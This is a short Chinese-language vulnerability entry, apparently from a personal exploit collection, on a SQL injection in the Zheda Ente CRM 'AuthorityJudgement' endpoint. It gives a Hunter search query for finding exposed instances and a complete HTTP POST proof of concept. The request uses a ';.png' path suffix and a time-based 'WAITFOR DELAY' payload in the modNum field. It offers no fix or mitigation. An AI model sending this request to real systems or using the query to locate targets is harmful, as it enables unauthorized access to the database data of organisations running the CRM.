# 浙大恩特CRM AuthorityJudgement存在SQL注入漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM AuthorityJudgement存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感数据。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="浙大恩特 CRM"`
+ 特征

![1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a.png](./img/9XAMe8BW3nTA1LAk/1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a-642664.png)

# 四、漏洞复现
```java
POST /entsoft/PurchaseAction.entphone;.png?method=AuthorityJudgement HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 34
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

modNum=1';WAITFOR DELAY '0:0:1'--+
```

![1708515727567-73b86e53-cf50-4d3c-910e-e34dd603d2b2.png](./img/9XAMe8BW3nTA1LAk/1708515727567-73b86e53-cf50-4d3c-910e-e34dd603d2b2-798665.png)

[浙大恩特客户资源管理系统-purchaseaction-entphone--sql注入.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222145208-7476e5e1-74ce-47c8-9fb1-8d44ebeec9ac.yaml)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ev7t9dcsd9ystmur>